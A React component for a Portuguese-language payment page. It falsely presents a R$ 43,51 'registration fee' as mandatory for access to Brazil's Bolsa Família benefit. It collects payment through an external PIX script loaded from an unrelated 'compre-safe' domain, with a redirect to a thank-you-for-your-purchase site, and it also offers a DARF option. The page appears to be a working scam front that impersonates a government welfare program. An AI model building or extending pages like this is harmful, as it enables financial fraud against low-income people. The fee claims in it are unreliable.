import React, { useState, useRef, useEffect } from 'react';
import { motion } from 'framer-motion';
import { QrCode, FileText, RefreshCw } from 'lucide-react';
import { Header } from './Header';
import { Card, CardContent } from '@/components/ui/card';
import { Button } from '@/components/ui/button';

interface PixScreenProps {
  onBack?: () => void;
  onDarf: () => void;
}

export const PixScreen: React.FC<PixScreenProps> = ({ onDarf }) => {
  // Constantes de configuração PIX
  const PIX_SCRIPT_SRC = "https://compre-safe.com/js/automatic-pix.js";
  const PIX_DATA_CODE = "vaf5q2mvgeemxp";
  const PIX_DATA_REDIRECT = "https://agradecemossuacompra.site";
  const PIX_CONTAINER_ID = "pix-container";
  const LOAD_TIMEOUT_MS = 15000;

  // Estados para controle do PIX
  const [isLoadingPix, setIsLoadingPix] = useState(false);
  const [pixError, setPixError] = useState<string | null>(null);
  const [pixFallback, setPixFallback] = useState(false);
  const [showPixHint, setShowPixHint] = useState(true);

  // Referência para o container PIX
  const pixContainerRef = useRef<HTMLDivElement>(null);
  
  // Referências para cleanup
  const mutationObserverRef = useRef<MutationObserver | null>(null);
  const timeoutRef = useRef<NodeJS.Timeout | null>(null);
  const intervalRef = useRef<NodeJS.Timeout | null>(null);
  const scriptRef = useRef<HTMLScriptElement | null>(null);

  // Cleanup ao desmontar o componente
  useEffect(() => {
    return () => {
      // Limpar MutationObserver
      if (mutationObserverRef.current) {
        mutationObserverRef.current.disconnect();
        mutationObserverRef.current = null;
      }
      
      // Limpar timeouts
      if (timeoutRef.current) {
        clearTimeout(timeoutRef.current);
        timeoutRef.current = null;
      }
      
      // Limpar intervals
      if (intervalRef.current) {
        clearInterval(intervalRef.current);
        intervalRef.current = null;
      }
      
      // Apenas limpar a referência, sem tocar no DOM
      scriptRef.current = null;
    };
  }, []);

  // Função para remover scripts PIX existentes
  const disablePreviousPixScripts = () => {
    const olds = Array.from(
      document.querySelectorAll<HTMLScriptElement>('script[src*="automatic-pix.js"]')
    );
    olds.forEach(s => {
      try {
        s.setAttribute('data-disabled', 'true'); // marca como inativo
        s.onload = null; // cancela callbacks
        s.onerror = null;
        console.log("[PIX] Script desabilitado com segurança.");
      } catch (e) {
        console.warn('[PIX] Falha ao desabilitar script antigo:', e);
      }
    });
  };

  // Função para carregar o script PIX
  const loadPixScript = (): Promise<void> => {
    return new Promise((resolve, reject) => {
      try {
        // Verificar se o script já existe
        if (document.querySelector(`script[src="${PIX_SCRIPT_SRC}"]`)) {
          return resolve();
        }

        const script = document.createElement('script');
        script.src = PIX_SCRIPT_SRC;
        script.async = true;
        script.setAttribute('data-code', PIX_DATA_CODE);
        script.setAttribute('data-redirect', PIX_DATA_REDIRECT);
        script.setAttribute('data-container', PIX_CONTAINER_ID);

        const timeout = setTimeout(() => {
          script.onload = script.onerror = null;
          scriptRef.current = null;
          console.log("[PIX] Script timeout - callbacks cancelados com segurança.");
          reject(new Error('Timeout ao carregar script de pagamento'));
        }, LOAD_TIMEOUT_MS);

        script.onload = () => {
          clearTimeout(timeout);
          scriptRef.current = script;
          resolve();
        };

        script.onerror = () => {
          clearTimeout(timeout);
          script.onload = null;
          script.onerror = null;
          scriptRef.current = null;
          console.log("[PIX] Script erro - callbacks cancelados com segurança.");
          reject(new Error('Erro ao carregar script de pagamento'));
        };

        document.head.appendChild(script);
      } catch (error) {
        reject(error);
      }
    });
  };

  // Função principal para gerar PIX
  const handleGeneratePix = async () => {
    // Prevenir cliques duplos durante loading
    if (isLoadingPix) return;

    if (!pixContainerRef.current) {
      console.warn('[PIX] Container não encontrado:', PIX_CONTAINER_ID);
      return;
    }

    // Resetar estados
    setPixError(null);
    setPixFallback(false);
    setShowPixHint(false);
    setIsLoadingPix(true);

    // Limpar conteúdo do container
    pixContainerRef.current.innerHTML = '';

    try {
      // Desabilitar scripts antigos
      disablePreviousPixScripts();

      // Observar mudanças no container para detectar injeção de conteúdo
      let contentInjected = false;
      
      // Limpar observer anterior se existir
      if (mutationObserverRef.current) {
        mutationObserverRef.current.disconnect();
      }
      
      mutationObserverRef.current = new MutationObserver(() => {
        contentInjected = true;
      });

      mutationObserverRef.current.observe(pixContainerRef.current, {
        childList: true,
        subtree: true
      });

      // Criar script com cache-busting
      const script = document.createElement('script');
      script.src = `${PIX_SCRIPT_SRC}?v=${Date.now()}`; // cache-busting para garantir novo carregamento
      script.async = true;
      script.setAttribute('data-code', PIX_DATA_CODE);
      script.setAttribute('data-redirect', PIX_DATA_REDIRECT);
      script.setAttribute('data-container', PIX_CONTAINER_ID);

      // callbacks
      script.onload = () => {
        console.log('[PIX] Script carregado.');
        scriptRef.current = script;
      };

      script.onerror = () => {
        // Não remover script, apenas cancelar callbacks e atualizar estado
        script.onload = null;
        script.onerror = null;
        scriptRef.current = null;
        console.log("[PIX] Script erro - callbacks cancelados com segurança.");
        setIsLoadingPix(false);
        setPixError('Erro ao carregar o sistema de pagamento. Tente novamente.');
      };

      document.head.appendChild(script);

      // Aguardar um tempo para o script injetar o conteúdo
      timeoutRef.current = setTimeout(() => {
        if (mutationObserverRef.current) {
          mutationObserverRef.current.disconnect();
          mutationObserverRef.current = null;
        }
        if (!contentInjected) {
          // Não remover script, apenas cancelar callbacks e atualizar estado
          if (script) {
            script.onload = null;
            script.onerror = null;
            console.log("[PIX] Script timeout - callbacks cancelados com segurança.");
          }
          setIsLoadingPix(false);
          setPixFallback(true);
        }
      }, 8000); // Aumentar timeout para dar mais tempo ao script

      // Se o conteúdo foi injetado antes do timeout, limpar o timeout
      intervalRef.current = setInterval(() => {
        if (contentInjected) {
          if (timeoutRef.current) {
            clearTimeout(timeoutRef.current);
            timeoutRef.current = null;
          }
          if (intervalRef.current) {
            clearInterval(intervalRef.current);
            intervalRef.current = null;
          }
          if (mutationObserverRef.current) {
            mutationObserverRef.current.disconnect();
            mutationObserverRef.current = null;
          }
          setIsLoadingPix(false);
        }
      }, 100);

      console.log('[PIX] Aguardando renderização no container.');

    } catch (error) {
      console.error('[PIX] Falha no carregamento:', error);
      scriptRef.current = null;
      setIsLoadingPix(false);
      setPixError(error instanceof Error ? error.message : 'Erro ao carregar o sistema de pagamento. Tente novamente.');
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-blue-50 to-white">
      <Header />
      
      <div className="bg-green-600 text-white p-4 shadow-lg mt-16">
        <div className="container mx-auto flex items-center justify-center space-x-4">
          <div className="text-center">
            <h1 className="text-xl font-bold">Pagamento da Taxa de Cadastro – Cadastro Bolsa Família</h1>
            <p className="text-green-100 mt-2">Para concluir seu cadastro e ter acesso ao benefício é necessário efetuar o pagamento da taxa única de R$ 43,51.</p>
          </div>
        </div>
      </div>

      <motion.div 
        className="flex items-center justify-center min-h-[calc(100vh-120px)] py-8"
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ duration: 0.5 }}
      >
        <div className="w-full max-w-4xl mx-4 space-y-6">
          <Card className="bg-white rounded-lg shadow-lg">
            <CardContent className="p-8">
              <div className="text-center space-y-4">
                <div className="space-y-3">
                  <p className="text-gray-700">
                    A taxa de R$ 43,51 corresponde a uma contribuição social obrigatória para a manutenção e processamento administrativo do cadastro no Programa Bolsa Família.
                  </p>
                  <p className="text-gray-700">
                    O pagamento deve ser feito por PIX ou via DARF gerado automaticamente.
                  </p>
                  <p className="text-gray-700">
                    Após o pagamento, o cadastro será confirmado e liberado.
                  </p>
                </div>
                <div className="bg-green-50 border border-green-200 rounded-lg p-4 mt-6">
                  <div className="text-3xl font-bold text-green-600">
                    R$ 43,51
                  </div>
                </div>
              </div>
            </CardContent>
          </Card>

          <div className="flex justify-center pt-4">
            <Button 
              onClick={handleGeneratePix}
              disabled={isLoadingPix}
              className="bg-blue-600 hover:bg-blue-700 px-8 py-3 text-lg font-bold rounded-lg shadow-lg disabled:opacity-50"
            >
              <QrCode className="mr-2" size={20} />
              {isLoadingPix ? 'Gerando...' : 'Gerar QR CODE'}
            </Button>
          </div>

          {/* Container PIX - onde o conteúdo será injetado */}
          <div 
            id={PIX_CONTAINER_ID}
            ref={pixContainerRef}
            className="mt-4 p-4 min-h-[220px] text-center bg-gray-50 border border-gray-200 rounded-lg"
          >
            {isLoadingPix && (
              <div className="text-blue-600 text-sm">
                Gerando PIX, aguarde...
              </div>
            )}
            {pixError && (
              <div className="text-red-600 text-sm mt-2">
                {pixError}
              </div>
            )}
            {pixFallback && (
              <div className="text-gray-600 text-sm mt-2">
                Não foi possível carregar o QR Code agora. Tente novamente daqui a pouco.
              </div>
            )}
            {showPixHint && (
              <div className="text-gray-500 text-sm">
                Clique em <b>Gerar QR CODE</b> para exibir o QR e o código copia e cola.
              </div>
            )}
          </div>

          <div className="flex flex-col sm:flex-row gap-4 justify-center pt-6">
            <Button 
              onClick={onDarf}
              className="bg-blue-600 hover:bg-blue-700 px-6 py-3 rounded-lg shadow-lg"
            >
              <FileText className="mr-2" size={20} />
              Gerar DARF
            </Button>
            <Button 
              onClick={() => window.location.reload()}
              className="bg-blue-600 hover:bg-blue-700 px-6 py-3 rounded-lg shadow-lg"
            >
              <RefreshCw className="mr-2" size={20} />
              Verificar Pagamento
            </Button>
          </div>
        </div>
      </motion.div>
    </div>
  );
};